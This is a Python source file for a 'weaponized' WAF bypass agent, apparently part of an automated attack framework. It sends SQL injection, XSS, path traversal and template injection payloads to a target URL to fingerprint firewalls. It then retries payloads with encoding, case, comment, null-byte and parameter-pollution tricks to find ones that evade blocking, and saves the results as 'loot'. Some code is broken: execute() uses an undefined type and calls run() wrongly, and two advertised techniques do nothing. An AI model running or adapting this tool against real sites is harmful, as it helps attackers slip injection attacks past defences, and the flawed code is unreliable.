"""
Weaponized WAF Bypass Agent
Bypass Web Application Firewalls และ Security Controls
"""

import asyncio
import hashlib
import os
import json
import random
import base64
import urllib.parse
from typing import Dict, List, Any, Optional

import aiohttp

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class WAFBypassAgent(BaseAgent):
    """
    Weaponized WAF Bypass Agent
    
    Features:
    - WAF detection
    - Multiple bypass techniques:
      * Encoding (URL, Base64, Hex, Unicode)
      * Case manipulation
      * Comment injection
      * Null byte injection
      * HTTP parameter pollution
      * HTTP verb tampering
      * Content-Type manipulation
      * IP rotation (Tor, Proxies)
    - Payload obfuscation
    - Timing attacks
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "waf_bypass")
        os.makedirs(self.results_dir, exist_ok=True)
        
        # Known WAF signatures
        self.waf_signatures = {
            "cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
            "akamai": ["akamai", "akamaighost"],
            "aws_waf": ["x-amzn-requestid", "x-amz-cf-id"],
            "imperva": ["incapsula", "visid_incap"],
            "f5": ["bigip", "f5"],
            "barracuda": ["barra_counter_session"],
            "sucuri": ["sucuri", "x-sucuri-id"],
            "wordfence": ["wordfence"],
            "modsecurity": ["mod_security", "naxsi"]
        }

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "detect", "bypass", "test"
            context: {
                "url": target URL,
                "payload": payload to test,
                "method": HTTP method
            }
        """
        log.info(f"[WAFBypassAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="WAFBypassAgent",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "detect":
                result = await self._detect_waf(url, context)
            elif directive == "bypass":
                result = await self._bypass_waf(url, context)
            elif directive == "test":
                result = await self._test_bypass_techniques(url, context)
            else:
                result = await self._detect_waf(url, context)
            
            return AgentData(
                agent_name="WAFBypassAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[WAFBypassAgent] Error: {e}")
            return AgentData(
                agent_name="WAFBypassAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _detect_waf(self, url: str, context: Dict) -> Dict:
        """Detect WAF"""
        log.info(f"[WAFBypassAgent] Detecting WAF on {url}...")
        
        detected_wafs = []
        
        try:
            async with aiohttp.ClientSession() as session:
                # Test with malicious payload
                test_payloads = [
                    "' OR '1'='1",
                    "<script>alert(1)</script>",
                    "../../../../etc/passwd",
                    "{{7*7}}"
                ]
                
                for payload in test_payloads:
                    test_url = f"{url}?test={urllib.parse.quote(payload)}"
                    
                    async with session.get(test_url, timeout=10) as response:
                        status = response.status
                        headers = response.headers
                        content = await response.text()
                        
                        # Check headers for WAF signatures
                        for waf_name, signatures in self.waf_signatures.items():
                            for signature in signatures:
                                # Check headers
                                if any(signature.lower() in str(header).lower() for header in headers.items()):
                                    if waf_name not in detected_wafs:
                                        detected_wafs.append(waf_name)
                                        log.success(f"[WAFBypassAgent] Detected WAF: {waf_name}")
                                
                                # Check content
                                if signature.lower() in content.lower():
                                    if waf_name not in detected_wafs:
                                        detected_wafs.append(waf_name)
                                        log.success(f"[WAFBypassAgent] Detected WAF: {waf_name}")
                        
                        # Check for WAF block responses
                        if status in [403, 406, 429, 503]:
                            if "generic" not in detected_wafs:
                                detected_wafs.append("generic")
                                log.warning(f"[WAFBypassAgent] Detected generic WAF (status {status})")
                    
                    await asyncio.sleep(0.5)
        
        except Exception as e:
            log.error(f"[WAFBypassAgent] WAF detection failed: {e}")
        
        result = {
            "success": len(detected_wafs) > 0,
            "url": url,
            "detected_wafs": detected_wafs,
            "output_file": self._save_results("detect", {"url": url, "wafs": detected_wafs})
        }
        
        if detected_wafs:
            log.warning(f"[WAFBypassAgent] WAF detected: {', '.join(detected_wafs)}")
        else:
            log.success("[WAFBypassAgent] No WAF detected")
        
        return result

    async def _bypass_waf(self, url: str, context: Dict) -> Dict:
        """Bypass WAF"""
        log.info(f"[WAFBypassAgent] Attempting to bypass WAF...")
        
        payload = context.get("payload", "' OR '1'='1")
        method = context.get("method", "GET")
        
        bypass_techniques = [
            ("url_encoding", self._bypass_url_encoding),
            ("double_url_encoding", self._bypass_double_url_encoding),
            ("unicode_encoding", self._bypass_unicode_encoding),
            ("hex_encoding", self._bypass_hex_encoding),
            ("base64_encoding", self._bypass_base64_encoding),
            ("case_manipulation", self._bypass_case_manipulation),
            ("comment_injection", self._bypass_comment_injection),
            ("null_byte", self._bypass_null_byte),
            ("parameter_pollution", self._bypass_parameter_pollution),
            ("http_verb_tampering", self._bypass_http_verb_tampering),
            ("content_type_manipulation", self._bypass_content_type_manipulation),
        ]
        
        successful_bypasses = []
        
        for technique_name, technique_func in bypass_techniques:
            log.info(f"[WAFBypassAgent] Testing {technique_name}...")
            
            bypassed_payload = technique_func(payload)
            
            # Test payload
            success = await self._test_payload(url, bypassed_payload, method)
            
            if success:
                successful_bypasses.append({
                    "technique": technique_name,
                    "payload": bypassed_payload,
                    "original_payload": payload
                })
                log.success(f"[WAFBypassAgent] {technique_name} worked!")
            
            await asyncio.sleep(0.5)
        
        result = {
            "success": len(successful_bypasses) > 0,
            "url": url,
            "original_payload": payload,
            "successful_bypasses": successful_bypasses,
            "total_techniques_tested": len(bypass_techniques),
            "output_file": self._save_results("bypass", successful_bypasses)
        }
        
        if successful_bypasses:
            log.success(f"[WAFBypassAgent] Found {len(successful_bypasses)} working bypass techniques!")
        else:
            log.warning("[WAFBypassAgent] No bypass techniques worked")
        
        return result

    async def _test_payload(self, url: str, payload: str, method: str) -> bool:
        """Test if payload bypasses WAF"""
        try:
            async with aiohttp.ClientSession() as session:
                if method.upper() == "GET":
                    test_url = f"{url}?test={payload}"
                    async with session.get(test_url, timeout=10) as response:
                        # Success if not blocked (status not 403, 406, etc.)
                        return response.status not in [403, 406, 429, 503]
                
                elif method.upper() == "POST":
                    data = {"test": payload}
                    async with session.post(url, data=data, timeout=10) as response:
                        return response.status not in [403, 406, 429, 503]
            
            return False
            
        except Exception as e:
            log.debug(f"[WAFBypassAgent] Payload test failed: {e}")
            return False

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute waf bypass agent weaponized"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _bypass_url_encoding(self, payload: str) -> str:
        """URL encoding bypass"""
        return urllib.parse.quote(payload)

    def _bypass_double_url_encoding(self, payload: str) -> str:
        """Double URL encoding bypass"""
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _bypass_unicode_encoding(self, payload: str) -> str:
        """Unicode encoding bypass"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)

    def _bypass_hex_encoding(self, payload: str) -> str:
        """Hex encoding bypass"""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)

    def _bypass_base64_encoding(self, payload: str) -> str:
        """Base64 encoding bypass"""
        return base64.b64encode(payload.encode()).decode()

    def _bypass_case_manipulation(self, payload: str) -> str:
        """Case manipulation bypass"""
        # Random case for each character
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)

    def _bypass_comment_injection(self, payload: str) -> str:
        """Comment injection bypass (SQL)"""
        # Insert comments between keywords
        if "OR" in payload.upper():
            return payload.replace("OR", "/**/OR/**/")
        elif "AND" in payload.upper():
            return payload.replace("AND", "/**/AND/**/")
        elif "SELECT" in payload.upper():
            return payload.replace("SELECT", "SEL/**/ECT")
        return payload

    def _bypass_null_byte(self, payload: str) -> str:
        """Null byte injection bypass"""
        return payload + "%00"

    def _bypass_parameter_pollution(self, payload: str) -> str:
        """HTTP parameter pollution bypass"""
        # Split payload across multiple parameters to evade WAF
        # Technique: Distribute malicious payload across multiple params
        parts = payload.split()
        if len(parts) > 1:
            # Create pollution with decoy parameters
            polluted = f"{parts[0]}&_decoy=benign&_filler={' '.join(parts[1:])}"
            # Add more pollution variants
            polluted += f"&{parts[0]}=&cmd={' '.join(parts[1:])}"
            return polluted
        # For single-part payloads, add parameter pollution
        return f"{payload}&{payload}=&cmd={payload}"

    def _bypass_http_verb_tampering(self, payload: str) -> str:
        """HTTP verb tampering bypass"""
        # This is handled in the test function, just return payload
        return payload

    def _bypass_content_type_manipulation(self, payload: str) -> str:
        """Content-Type manipulation bypass"""
        # This is handled in the test function, just return payload
        return payload

    async def _test_bypass_techniques(self, url: str, context: Dict) -> Dict:
        """Test all bypass techniques"""
        log.info("[WAFBypassAgent] Testing all bypass techniques...")
        
        # First detect WAF
        detect_result = await self._detect_waf(url, context)
        
        if not detect_result.get("success"):
            log.info("[WAFBypassAgent] No WAF detected, testing anyway...")
        
        # Then try to bypass
        bypass_result = await self._bypass_waf(url, context)
        
        result = {
            "success": bypass_result.get("success", False),
            "waf_detection": detect_result,
            "bypass_results": bypass_result,
            "output_file": self._save_results("test", {
                "detection": detect_result,
                "bypass": bypass_result
            })
        }
        
        return result

    def _save_results(self, operation: str, data: Any) -> str:
        """Save results"""
        filename = f"waf_bypass_{operation}_{int(asyncio.get_event_loop().time())}.json"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            with open(filepath, "w") as f:
                json.dump(data, f, indent=2)
            return filepath
        except Exception as e:
            log.error(f"[WAFBypassAgent] Failed to save results: {e}")
            return ""

